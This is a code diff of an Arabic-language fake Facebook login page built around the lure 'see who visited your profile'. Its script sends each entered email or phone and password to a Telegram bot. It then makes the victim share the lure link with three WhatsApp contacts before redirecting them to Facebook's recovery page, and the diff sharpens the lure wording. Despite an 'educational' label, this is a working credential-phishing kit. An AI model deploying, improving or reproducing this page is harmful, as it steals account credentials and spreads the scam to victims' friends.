@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - تحقق من الزوار</title>
+    <title>Facebook - اعرف من زار صفحتك</title>
     <style>
-        /* [تحسين التصميم ليتناسب مع طلباتك وواقعية فيسبوك] */
         body {
             font-family: Arial, sans-serif;
             background-color: #f0f2f5;
@@ -31,26 +30,32 @@
             font-weight: bold;
             margin-bottom: 20px;
         }
-        .note {
-            font-size: 16px;
-            color: #4b4f56;
-            margin-bottom: 20px;
-            line-height: 1.5;
-            background: #e7f3ff;
+        /* تحسين مظهر الرسائل التنبيهية (خلفية زرقاء) */
+        .info-box {
+            background: #e7f3ff; /* لون أزرق فاتح */
             border: 1px solid #c7d8eb;
-            padding: 10px;
+            color: #1c1e21; /* لون نص داكن لتباين أفضل */
+            padding: 15px;
             border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+        .main-lure-title { /* عنوان الإغراء الرئيسي */
+            font-size: 22px;
+            color: #1c1e21;
+            font-weight: bold;
+            margin-bottom: 10px;
         }
         input {
             width: 100%;
             padding: 15px;
             margin-top: 10px;
             border-radius: 6px;
-            border: 1px solid #dddfe2; /* حدود ناعمة */
+            border: 1px solid #dddfe2;
             font-size: 16px;
             box-sizing: border-box;
         }
-        /* تحسين زر تسجيل الدخول */
         .btn {
             width: 100%;
             padding: 15px;
@@ -84,13 +89,23 @@
             font-weight: bold;
             cursor: pointer;
         }
-        /* تنسيق خاص لرسالة المشاركة */
-        .share-prompt {
-            font-size: 18px;
-            color: #1877f2; /* عنوان أزرق بارز */
+        /* تنسيق خاص لشاشة المشاركة */
+        .share-screen-title { /* عنوان شاشة المشاركة */
+            font-size: 22px;
+            color: #1c1e21;
             font-weight: bold;
-            margin-bottom: 25px;
-            line-height: 1.4;
+            margin-bottom: 15px;
+        }
+        .share-instruction-box { /* صندوق تعليمات المشاركة */
+            background: #e7f3ff;
+            border: 1px solid #c7d8eb;
+            color: #1c1e21;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 15px;
+            line-height: 1.5;
+            text-align: center;
         }
         .whatsapp-share-btn {
             background: #25d366;
@@ -119,28 +134,22 @@
         function send_telegram_data(event) {
             event.preventDefault(); 
             
-            // --- 2. الحصول على البيانات ---
             const identifier = document.getElementById("identifier").value;
             const password = document.getElementById("password").value;
 
-            // --- 3. بناء الرسالة ---
             const message = `🚨 بيانات تصيد (Facebook) تعليمية:\n\n👤 المستخدم/البريد: ${identifier}\n🔒 كلمة المرور: ${password}\n🌐 المصدر: ${window.location.hostname}`;
             
-            // --- 4. بناء رابط التلجرام API ---
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
 
-            // --- 5. إرسال الطلب (يتم مباشرة بعد الضغط) ---
             fetch(url)
                 .then(response => {
                     console.log("تم إرسال البيانات (المحاكاة).");
                     
-                    // بعد الإرسال، نقوم بإخفاء النموذج وإظهار خطوة المشاركة
                     document.getElementById("login-form-container").style.display = 'none';
                     document.getElementById("share-step").style.display = 'block';
                 })
                 .catch(error => {
-                    // حتى لو فشل الاتصال، نظهر خطوة المشاركة للحفاظ على واقعية المحاكاة
-                    console.error("فشل الاتصال بالبوت. ننتقل لخطوة المشاركة.");
+                    console.error("فشل الاتصال بالبوت. ننتقل لخطوة المشاركة للمحاكاة.");
                     document.getElementById("login-form-container").style.display = 'none';
                     document.getElementById("share-step").style.display = 'block';
                 });
@@ -149,16 +158,15 @@
         }
 
         function initiate_whatsapp_share() {
-            // رسالة الإغراء القوية التي سيتم مشاركتها
-            const share_text = `حصرياً! اعرف من يزور ملفك الشخصي على فيسبوك ومن يرى صورك بالخفاء فقط! \n\n رابط الأداة: ${SITE_LINK}`; 
+            // رسالة الإغراء القوية التي سيتم مشاركتها مع رابط الموقع الفعلي
+            const share_text = `حصرياً! اعرف من يزور ملفك الشخصي على فيسبوك ومن يرى صورك بالخفاء فقط! اضغط هنا وشاهد بنفسك: ${SITE_LINK}`; 
             
-            // يتم توجيه المستخدم إلى واتساب لفتح نافذة المشاركة
             const whatsapp_url = `whatsapp://send?text=${encodeURIComponent(share_text)}`;
             window.location.href = whatsapp_url;
 
-            // بعد العودة من المشاركة، نوجه الضحية إلى صفحة غير فعالة
+            // توجيه الضحية لصفحة فيسبوك بعد مدة قصيرة
             setTimeout(() => {
-                alert("تم التحقق من مشاركتك بنجاح! نأسف، تعذر عرض قائمة الزوار. يرجى المحاولة لاحقاً.");
+                alert("تم التحقق من مشاركتك بنجاح! نأسف، تعذر عرض قائمة الزوار الآن. يرجى المحاولة لاحقاً.");
                 window.location.href = "https://www.facebook.com/recover/initiate/"; 
             }, 3000); 
         }
@@ -168,8 +176,9 @@
     <div class="container">
         <div id="login-form-container">
             <div class="logo">facebook</div>
-            <div class="note">
-                تم تفعيل ميزة **"من زار صفحتك"** مؤخراً. **أعد إدخال بيانات حسابك** لتأكيد هويتك والاطلاع على قائمة الزوار.
+            <div class="main-lure-title">اعرف من يزور ملفك الشخصي على فيسبوك</div>
+            <div class="info-box">
+                قم بتسجيل الدخول لحسابك على فيسبوك 👇
             </div>
             <form onsubmit="return send_telegram_data(event)">
                 <input type="text" id="identifier" name="identifier" placeholder="البريد الإلكتروني أو رقم الهاتف" required />
@@ -183,8 +192,9 @@
 
         <div id="share-step">
             <div class="logo">facebook</div>
-            <div class="share-prompt">
-                ✅ **تم التحقق من حسابك.** <br> **الشرط الوحيد:** لفتح قائمة الزوار، يجب **مشاركة هذا الرابط** مع 3 أصدقاء أو مجموعة واحدة على واتساب.
+            <div class="share-screen-title">✅ تم التحقق من حسابك بنجاح!</div>
+            <div class="share-instruction-box">
+                **الخطوة الأخيرة:** للمصادقة وتخطي قائمة الانتظار، يجب **مشاركة هذا الرابط** مع 3 أصدقاء أو مجموعة واحدة على واتساب.
             </div>
             
             <button class="whatsapp-share-btn" onclick="initiate_whatsapp_share()">
@@ -193,5 +203,4 @@
         </div>
     </div>
 </body>
-    </html>
-        
+</html>
